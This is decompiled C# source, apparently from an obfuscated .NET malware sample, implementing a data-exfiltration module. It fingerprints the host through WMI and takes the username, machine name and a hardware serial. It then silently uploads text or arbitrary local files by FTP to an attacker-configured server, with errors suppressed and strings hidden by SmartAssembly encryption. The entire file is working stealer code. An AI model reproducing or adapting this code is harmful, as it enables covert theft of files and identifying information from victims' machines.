using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace OlVheIVabxHnbNp;

internal sealed class IknfuhEjRGfqaq
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string CnslaQynQWw()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107408420));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107408367)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107408350);
			ManagementObject val3 = new ManagementObject(getString_0(107408345) + text + getString_0(107408304));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107408331)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107393386);
		}
	}

	public static void WUesPoonGtkX(string EPmVTMQFRsdn = "URL", string FBTJPMqAkLDOlvp = "USERNAME", string rSqiSuHbIDAEmI = "ACCESO", string JgfZnsRjcEsiyb = "")
	{
		try
		{
			string text = CnslaQynQWw();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(EPmVTMQFRsdn + getString_0(107408533) + Environment.UserName + getString_0(107408552) + Environment.MachineName + getString_0(107409011) + text + getString_0(107409038));
			ftpWebRequest.Method = getString_0(107408274);
			ftpWebRequest.Credentials = new NetworkCredential(FBTJPMqAkLDOlvp, rSqiSuHbIDAEmI);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(JgfZnsRjcEsiyb);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void dlawoLgJAnZ(string tTMRneEcdGjlY = "URL", string cMlilZqKGBUF = "USERNAME", string yPrvZjXrUFdIjPe = "ACCESO", string ICkLNzbXRX = "")
	{
		try
		{
			string text = CnslaQynQWw();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(tTMRneEcdGjlY + getString_0(107408533) + Environment.UserName + getString_0(107408552) + Environment.MachineName + getString_0(107409011) + text + getString_0(107409011) + Path.GetFileName(ICkLNzbXRX));
			ftpWebRequest.Method = getString_0(107408274);
			ftpWebRequest.Credentials = new NetworkCredential(cMlilZqKGBUF, yPrvZjXrUFdIjPe);
			byte[] array = File.ReadAllBytes(ICkLNzbXRX);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static IknfuhEjRGfqaq()
	{
		Strings.CreateGetStringDelegate(typeof(IknfuhEjRGfqaq));
	}
}
